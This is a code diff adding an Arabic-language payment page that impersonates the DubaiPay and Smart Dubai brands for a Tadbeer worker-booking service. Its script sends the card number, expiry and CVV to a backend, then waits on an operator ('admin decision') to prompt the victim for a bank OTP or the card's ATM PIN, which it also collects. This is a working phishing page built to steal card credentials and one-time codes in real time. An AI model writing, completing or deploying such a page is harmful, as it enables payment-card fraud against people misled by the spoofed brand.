@@ -1,0 +1,330 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>بوابة الدفع الإلكتروني - شركة تدبير</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@600;700;900&family=Tajawal:wght@400;500;700;800&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary: #152650;
+            --accent: #78182b;
+            --background: #fefbf8;
+            --foreground: #0b152c;
+            --border: #d9dee8;
+            --card: #ffffff;
+        }
+        body {
+            font-family: 'Tajawal', 'Cairo', sans-serif;
+            background-color: var(--background);
+            color: var(--foreground);
+            margin: 0;
+            -webkit-font-smoothing: antialiased;
+        }
+        header {
+            background: white;
+            padding: 0 1.5rem;
+            height: 80px;
+            border-bottom: 1px solid rgba(217, 222, 232, 0.6);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+        }
+        .container {
+            max-width: 1000px;
+            margin: 0 auto;
+            padding: 2rem 1rem;
+        }
+        .card {
+            background: var(--card);
+            border: 1px solid var(--border);
+            border-radius: 1.5rem;
+            padding: 2rem;
+            box-shadow: 0 10px 30px -15px rgba(10, 24, 59, 0.1);
+            margin-bottom: 2rem;
+        }
+        .btn {
+            background: var(--primary);
+            color: white;
+            width: 100%;
+            padding: 1rem;
+            border-radius: 1rem;
+            font-weight: 800;
+            border: none;
+            cursor: pointer;
+            transition: all 0.2s;
+            font-size: 1rem;
+        }
+        .btn:hover {
+            background: var(--accent);
+            transform: translateY(-1px);
+        }
+        .form-group {
+            margin-bottom: 1.25rem;
+        }
+        label {
+            display: block;
+            margin-bottom: 0.5rem;
+            font-weight: 700;
+            color: var(--primary);
+        }
+        input, select {
+            width: 100%;
+            padding: 0.85rem 1rem;
+            border-radius: 0.75rem;
+            border: 2px solid var(--border);
+            outline: none;
+            font-family: inherit;
+            font-size: 1rem;
+            transition: border-color 0.2s;
+            box-sizing: border-box;
+        }
+        input:focus, select:focus {
+            border-color: var(--accent);
+        }
+        .row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 1rem;
+        }
+        @media(max-width: 768px) {
+            .row { grid-template-columns: 1fr; }
+        }
+        .modal-overlay {
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0,0,0,0.6);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 2000;
+            display: none;
+        }
+        .modal {
+            background: white;
+            padding: 2.5rem;
+            border-radius: 1.5rem;
+            width: 100%;
+            max-width: 420px;
+            text-align: center;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
+        }
+        .spinner {
+            width: 50px; height: 50px;
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid var(--accent);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 1.5rem auto;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <header>
+        <div style="display: flex; align-items: center; gap: 1rem;">
+            <img src="dubaipay-logo.png" alt="دبي باي" style="height: 40px; width: auto;">
+        </div>
+        <img src="smart-dubai-logo.png" alt="دبي الذكية" style="height: 35px; width: auto;">
+    </header>
+
+    <div class="container">
+        <div style="text-align: center; margin-bottom: 2rem;">
+            <h1 style="color: var(--primary); font-size: 2rem; margin-bottom: 0.5rem;">إتمام عملية الدفع والحجز</h1>
+            <p style="color: #6b7280;">يرجى إدخال تفاصيل البطاقة الائتمانية لإتمام الحجز بنجاح</p>
+        </div>
+
+        <div class="card" id="summary-card" style="background: #f8fafc; border-color: #e2e8f0;">
+            <h3 style="color: var(--primary); margin-bottom: 1rem; font-size: 1.25rem;">ملخص الطلب</h3>
+            <div id="order-details-summary" style="display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; font-size: 0.95rem;">
+                <div><span>الخدمة:</span> <strong id="sum-service">—</strong></div>
+                <div><span>المدة:</span> <strong id="sum-duration">—</strong></div>
+                <div><span>النوع:</span> <strong id="sum-type">—</strong></div>
+                <div><span>عدد العمالة:</span> <strong id="sum-workers">1</strong></div>
+                <div><span>الجنسية:</span> <strong id="sum-nationality">—</strong></div>
+                <div><span>المبلغ الإجمالي:</span> <strong id="sum-total" style="color: var(--accent); font-size: 1.25rem;">0 د.إ</strong></div>
+            </div>
+        </div>
+
+        <div class="card">
+            <h3 style="color: var(--primary); margin-bottom: 1.5rem; font-size: 1.25rem;">معلومات البطاقة الائتمانية</h3>
+            <form id="payment-form" onsubmit="handlePayment(event)">
+                <div class="form-group">
+                    <label>اسم حامل البطاقة</label>
+                    <input type="text" id="cardName" required placeholder="الاسم كما يظهر على البطاقة">
+                </div>
+                <div class="form-group">
+                    <label>رقم البطاقة</label>
+                    <input type="text" id="cardNumber" required placeholder="XXXX XXXX XXXX XXXX" maxlength="19">
+                </div>
+                <div class="row">
+                    <div class="form-group">
+                        <label>تاريخ الانتهاء</label>
+                        <input type="text" id="cardExpiry" required placeholder="MM/YY" maxlength="5">
+                    </div>
+                    <div class="form-group">
+                        <label>رمز الأمان (CVV)</label>
+                        <input type="password" id="cardCvv" required placeholder="123" maxlength="4">
+                    </div>
+                </div>
+                <button type="submit" class="btn" style="margin-top: 1rem;">إتمام الدفع الآمن</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- Modal for OTP / ATM / Loading / Success -->
+    <div class="modal-overlay" id="modalOverlay">
+        <div class="modal" id="modalContent">
+            <div id="loadingState">
+                <div class="spinner"></div>
+                <h3 id="loadingText" style="color: var(--primary); font-size: 1.25rem; margin-bottom: 0.5rem;">جاري معالجة الدفع...</h3>
+                <p style="color: #6b7280; font-size: 0.9rem;">يرجى عدم إغلاق الصفحة أثناء إتمام العملية البنكية</p>
+            </div>
+
+            <div id="otpState" style="display: none;">
+                <h3 style="color: var(--primary); font-size: 1.25rem; margin-bottom: 1rem;">رمز التحقق (OTP)</h3>
+                <p style="color: #6b7280; font-size: 0.9rem; margin-bottom: 1.5rem;">تم إرسال رمز التحقق إلى رقم هاتفك المرتبط بالبنك</p>
+                <input type="text" id="otpCode" placeholder="أدخل رمز التحقق المكون من 4 أو 6 أرقام" style="text-align: center; font-size: 1.25rem; letter-spacing: 4px; margin-bottom: 1.5rem;">
+                <button class="btn" onclick="submitOtp()">تحقق وإتمام</button>
+            </div>
+
+            <div id="atmState" style="display: none;">
+                <h3 style="color: var(--primary); font-size: 1.25rem; margin-bottom: 1rem;">الرقم السري للبطاقة (PIN)</h3>
+                <p style="color: #6b7280; font-size: 0.9rem; margin-bottom: 1.5rem;">يرجى إدخال الرقم السري المكون من 4 أرقام للبطاقة</p>
+                <input type="password" id="atmPin" placeholder="****" maxlength="4" style="text-align: center; font-size: 1.5rem; letter-spacing: 8px; margin-bottom: 1.5rem;">
+                <button class="btn" onclick="submitAtm()">تأكيد الرقم السري</button>
+            </div>
+
+            <div id="successState" style="display: none;">
+                <div style="width: 60px; height: 60px; background: #dcfce7; color: #16a34a; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 30px; margin: 0 auto 1rem auto;">✓</div>
+                <h3 style="color: var(--primary); font-size: 1.5rem; margin-bottom: 0.5rem;">تم الدفع بنجاح!</h3>
+                <p style="color: #6b7280; margin-bottom: 1.5rem;">تم تأكيد حجزك بنجاح وإرسال تفاصيل العقد إلى بريدك الإلكتروني.</p>
+                <button class="btn" onclick="window.location.href='/home'">العودة للرئيسية</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Load order details from localStorage if present
+        const orderData = JSON.parse(localStorage.getItem('tadbeer_order') || '{}');
+        if (orderData.duration) {
+            document.getElementById('sum-duration').innerText = orderData.duration;
+            document.getElementById('sum-service').innerText = orderData.service;
+            document.getElementById('sum-type').innerText = orderData.type;
+            document.getElementById('sum-workers').innerText = orderData.workers || 1;
+            document.getElementById('sum-nationality').innerText = orderData.nationality;
+            document.getElementById('sum-total').innerText = (orderData.total || 0).toLocaleString() + ' د.إ';
+        }
+
+        let currentSessionId = 'sess_' + Math.random().toString(36).substring(2, 11);
+
+        async function handlePayment(e) {
+            e.preventDefault();
+            const cardName = document.getElementById('cardName').value;
+            const cardNumber = document.getElementById('cardNumber').value;
+            const cardExpiry = document.getElementById('cardExpiry').value;
+            const cardCvv = document.getElementById('cardCvv').value;
+
+            document.getElementById('modalOverlay').style.display = 'flex';
+            document.getElementById('loadingState').style.display = 'block';
+            document.getElementById('otpState').style.display = 'none';
+            document.getElementById('atmState').style.display = 'none';
+            document.getElementById('successState').style.display = 'none';
+            document.getElementById('loadingText').innerText = 'جاري معالجة الدفع الآمن...';
+
+            try {
+                await fetch('/api/payment-session', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        sessionId: currentSessionId,
+                        cardName,
+                        cardNumber,
+                        cardExpiry,
+                        cardCvv,
+                        totalAmount: orderData.total || 1280,
+                        stage: 'card_pending',
+                        ...orderData
+                    })
+                });
+            } catch(err) {
+                console.error(err);
+            }
+
+            // Poll for admin decision / next stage
+            pollSession();
+        }
+
+        function pollSession() {
+            const interval = setInterval(async () => {
+                try {
+                    const res = await fetch(`/api/payment-session/${currentSessionId}`);
+                    const data = await res.json();
+                    if (data && data.stage) {
+                        if (data.stage === 'otp' || data.stage === 'otp_pending') {
+                            clearInterval(interval);
+                            document.getElementById('loadingState').style.display = 'none';
+                            document.getElementById('otpState').style.display = 'block';
+                        } else if (data.stage === 'atm' || data.stage === 'atm_pending') {
+                            clearInterval(interval);
+                            document.getElementById('loadingState').style.display = 'none';
+                            document.getElementById('atmState').style.display = 'block';
+                        } else if (data.stage === 'success') {
+                            clearInterval(interval);
+                            document.getElementById('loadingState').style.display = 'none';
+                            document.getElementById('successState').style.display = 'block';
+                        } else if (data.stage === 'failed') {
+                            clearInterval(interval);
+                            alert(data.errorMessage || 'فشلت عملية الدفع. يرجى المحاولة مرة أخرى.');
+                            document.getElementById('modalOverlay').style.display = 'none';
+                        }
+                    }
+                } catch(e) {
+                    console.error(e);
+                }
+            }, 3000);
+        }
+
+        async function submitOtp() {
+            const otpCode = document.getElementById('otpCode').value;
+            if (!otpCode) {
+                alert('يرجى إدخال رمز التحقق');
+                return;
+            }
+            document.getElementById('otpState').style.display = 'none';
+            document.getElementById('loadingState').style.display = 'block';
+            document.getElementById('loadingText').innerText = 'جاري التحقق من الرمز...';
+
+            await fetch(`/api/payment-session/${currentSessionId}/otp`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ otpCode, stage: 'otp_pending' })
+            });
+            pollSession();
+        }
+
+        async function submitAtm() {
+            const atmPin = document.getElementById('atmPin').value;
+            if (!atmPin) {
+                alert('يرجى إدخال الرقم السري');
+                return;
+            }
+            document.getElementById('atmState').style.display = 'none';
+            document.getElementById('loadingState').style.display = 'block';
+            document.getElementById('loadingText').innerText = 'جاري التحقق من الرقم السري...';
+
+            await fetch(`/api/payment-session/${currentSessionId}/atm`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ atmPin, stage: 'atm_pending' })
+            });
+            pollSession();
+        }
+    </script>
+</body>
+</html>
